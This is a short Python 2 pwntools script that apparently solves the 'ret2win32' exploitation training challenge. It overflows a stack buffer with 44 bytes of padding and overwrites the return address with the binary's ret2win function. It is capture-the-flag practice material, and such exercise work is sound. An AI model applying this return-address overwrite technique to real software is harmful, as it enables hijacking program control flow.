#!/usr/bin/env python2
from pwn import *
context(arch='i386', os='linux')

def pwn():

    e = ELF("./ret2win32")
    ret2winaddr = p32(e.symbols["ret2win"])

    ''' Create buffer '''
    buf = "A" * 44

    io = e.process()
    io.sendline(buf + ret2winaddr)
    print(io.recvall())

if __name__ == '__main__':
    pwn()
